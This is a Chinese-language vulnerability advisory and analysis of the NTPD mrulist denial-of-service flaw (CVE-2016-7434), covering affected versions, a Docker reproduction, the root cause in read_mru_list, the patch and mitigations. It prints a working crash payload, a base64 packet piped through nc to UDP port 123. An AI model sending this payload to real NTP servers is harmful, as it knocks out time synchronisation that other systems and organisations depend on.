**Author: LG, dawu (知道创宇404实验室)**
## 前言
NTP服务对于互联网来说是不可或缺的，很多东西都能和它联系到一起。就在不久前，轰动一时的德国断网事件中也出现了它的影子。保证NTP服务器的安全是很重要的！
## 0x00 漏洞概述
### 1.漏洞简介
NTPD是一个linux系统下同步不同机器时间的服务程序。 近日NTP.org公布了一个拒绝服务漏洞，该漏洞能够导致NTPD服务遭受远程DoS攻击。
### 2.漏洞影响
受影响版本面临DoS攻击风险
### 3.影响版本
  * 4.3.90
  * 4.3.25
  * 4.3
  * 4.3.93
  * 4.3.92
  * 4.3.77
  * 4.3.70
  * 4.2.8p8
  * 4.2.8p7
  * 4.2.8p6
  * 4.2.8p5
  * 4.2.8p4
  * 4.2.8p3
  * 4.2.8p2
  * 4.2.8p1
  * 4.2.7p22
## 0x01 漏洞详情
### 漏洞细节
NTPD服务端配置安全性低，能接收任意端`mrulist`数据包。此时攻击者能够远程发送经过构造的`mrulist`数据包对其进行Dos攻击。
### 漏洞检测方法
使用以下命令检测NTP版本： `# ntpq -c version` 受影响版本列表中的版本未作相关安全配置将受漏洞影响。
github上已有公布的漏洞利用poc，但是该poc会使NTPD服务崩溃，利用后需要重启服务。
[漏洞利用poc](https://github.com/opsxcq/exploit-CVE-2016-7434/blob/master/exploit.py)
### 漏洞复现
docker搭建环境：
    docker run --rm -it --name ntpvulnerable -p 123:123/udp vulnerables/cve-2016-7434 
 之后命令行输入：
    echo "FgoAEAAAAAAAAAA2bm9uY2UsIGxhZGRyPVtdOkhyYWdzPTMyLCBsYWRkcj1bXTpXT1AAMiwgbGFkZHI9W106V09QAAA=" | base64 -d | nc -u -v 127.0.0.1 123
最后NTPD服务崩溃 
### 漏洞分析
#### payload分析
漏洞发现者构造了这样一段`mrulist`数据包
    FgoAEAAAAAAAAAA2bm9uY2UsIGxhZGRyPVtdOkhyYWdzPTMyLCBsYWRkcj1bXTpXT1AAMiwgbGFkZHI9W106V09QAAA=
base64解码后：
base64解码（以16进制显示）：
    \x16 \x0a \x00 \x10 \x00 \x00 \x00 \x00 
    \x00 \x00 \x00 \x36 \x6e \x6f \x6e \x63 
    \x65 \x2c \x20 \x6c \x61 \x64 \x64 \x72 
    \x3d \x5b \x5d \x3a \x48 \x72 \x61 \x67 
    \x73 \x3d \x33 \x32 \x2c \x20 \x6c \x61 
    \x64 \x64 \x72 \x3d \x5b \x5d \x3a \x57 
    \x4f \x50 \x00 \x32 \x2c \x20 \x6c \x61 
    \x64 \x64 \x72 \x3d \x5b \x5d \x3a \x57 
    \x4f \x50 \x00 \x00 
此处参考NTP协议格式：
NTP packet = NTP header + Four TimeStamps = 48byte
NTP header : 16byte
LI(LeapYearIndicator) | VN(VersionNumber) | Mode | Stratum |
Poll(PollInterval) | Precision  
---|---|---|---|---|---  
2bit | 3bit | 3bit | 8bit | 8bit | 8bit  
详情请看 [NTP报文格式](http://support.ntp.org/bin/view/Support/DraftRfc2030)
> 主要字段的解释如下： ·LI（Leap
> Indicator，闰秒提示）：长度为2比特，值为“11”时表示告警状态，时钟未被同步。为其他值时NTP本身不做处理。 ·VN（Version
> Number，版本号）：长度为3比特，表示NTP的版本号，目前的最新版本为4。
> ·Mode：长度为3比特，表示NTP的工作模式。不同的值所表示的含义分别是：0未定义、1表示主动对等体模式、2表示被动对等体模式、3表示客户模式、4表示服务器模式、5表示广播模式或组播模式、6表示此报文为NTP控制报文、7预留给内部使用。
> ·Stratum：系统时钟的层数，取值范围为1～16，它定义了时钟的准确度。层数为1的时钟准确度最高，准确度从1到16依次递减，层数为16的时钟处于未同步状态。
> ·Poll：轮询时间，即两个连续NTP报文之间的时间间隔。 ·Precision：系统时钟的精度。
了解了NTP的报文格式后，上文数据包中的NTP header：
    \x16 \x0a \x00 \x10 \x00 \x00 \x00 \x00
    \x00 \x00 \x00 \x36 \x6e \x6f \x6e \x63
payload分析到这里暂时无下文，于是我们转去研究了漏洞触发点部分
#### 漏洞触发点分析
如下图，我们根据valgrind给出的调试信息寻找漏洞触发点
判断漏洞触发点位于 **ntpd/ntp_control.c:4041，read_mru_list()** 函数体内
漏洞触发原因是`estrdup`函数空指针的引用。
>
> `estrdup`函数的参数不能为`NULL`，否则会使程序崩溃。因为`estrdup`函数包含了`strdup`函数，而`strdup`函数又包含了`strlen`函数，该函数参数不能是`NULL`。
那么这说明`val`是有可能引入空指针的了？ `val`是由`ctl_getitem()`函数引入的，稍后我们上溯去看。
我们先来看read_mru_list函数中`var list`：
    /*
         * fill in_parms var list with all possible input parameters.
         */
        in_parms = NULL;
        set_var(&in_parms, nonce_text, sizeof(nonce_text), 0);
        set_var(&in_parms, frags_text, sizeof(frags_text), 0);
        set_var(&in_parms, limit_text, sizeof(limit_text), 0);
        set_var(&in_parms, mincount_text, sizeof(mincount_text), 0);
        set_var(&in_parms, resall_text, sizeof(resall_text), 0);
        set_var(&in_parms, resany_text, sizeof(resany_text), 0);
        set_var(&in_parms, maxlstint_text, sizeof(maxlstint_text), 0);
        set_var(&in_parms, laddr_text, sizeof(laddr_text), 0);
        for (i = 0; i text)) {
                free(pnonce);
                pnonce = (*val) ? estrdup(val) : NULL;
其中`char * val` 变为`const char * val`
     -  char *          val;
     +  const char *        val;
修改后逻辑运行为必须通过`void *` 从指针中去掉`const`属性。 接着严格判断`val`是不是`NULL`，若`val`指针为`NULL`则中断。
在此情况下原漏洞触发点处变为先判断`*val`，判断式只会为真，避免了空指针的引用，从而修复了此处漏洞。
#### 漏洞利用分析
在实际场景中，存在漏洞的NTPD服务器如果未作任何防护措施，攻击者极易对其进行远程DoS攻击。但是攻击结果仅是使服务崩溃，重启服务就能正常运行，对NTP服务器本身无其他深层影响。
但是，如实验室，飞机场，银行等机构的业务结算对于时间的校验应该非常严格。一旦针对性地攻击与它们相关联的NTP服务器导致系统时间无法正常同步，对于业务结算等是能够造成一定冲击的。
## 0x02 漏洞防护措施
  1. 只允许接收来自信任主机的mrulist查询包
  2. 升级到ntpd4.2.8p9
  3. 执行BCP-38标准
## 0x03 参考
  * [NTP报文格式](http://support.ntp.org/bin/view/Support/DraftRfc2030)
  * 
  * 
  * 
* * *